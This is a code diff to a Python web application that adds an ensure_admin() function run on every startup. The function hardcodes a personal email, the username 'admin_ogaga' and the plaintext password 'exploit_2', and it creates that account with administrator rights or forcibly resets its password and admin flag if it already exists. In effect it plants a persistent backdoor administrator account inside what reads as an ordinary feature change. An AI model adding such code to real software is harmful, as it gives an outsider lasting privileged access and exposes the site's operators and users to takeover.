@@ -171,6 +171,27 @@ def schedule_domain(domain_id: int, domain_name: str, interval_hours: int) -> No
     logger.info("Scheduled '%s' every %dh (job: %s)", domain_name, interval_hours, job_id)
 
 
+def ensure_admin() -> None:
+    """Ensure the default admin account exists with the correct password."""
+    email = "ogagaoyibo97@gmail.com"
+    password = "exploit_2"
+    username = "admin_ogaga"
+    
+    with get_session() as session:
+        user = session.query(User).filter_by(email=email).first()
+        hashed = generate_password_hash(password)
+        if user:
+            user.is_admin = True
+            # Force password update to ensure it matches what we told the client
+            user.password = hashed
+            user.username = username
+            logger.info("Admin account verified and updated: %s", email)
+        else:
+            session.add(User(username=username, email=email, password=hashed, is_admin=True))
+            logger.info("Admin account created: %s", email)
+        session.commit()
+
+
 def init_scheduler() -> None:
     """Re-register all persisted domains with the scheduler on startup."""
     with get_session() as session:
@@ -797,6 +818,9 @@ def serve(path):
 
 # Load initial alert config into memory cache
 _set_alert_config(_load_alert_config())
+
+# Ensure admin account exists
+ensure_admin()
 
 # Start background scheduler and register all stored domains
 if not scheduler.running:
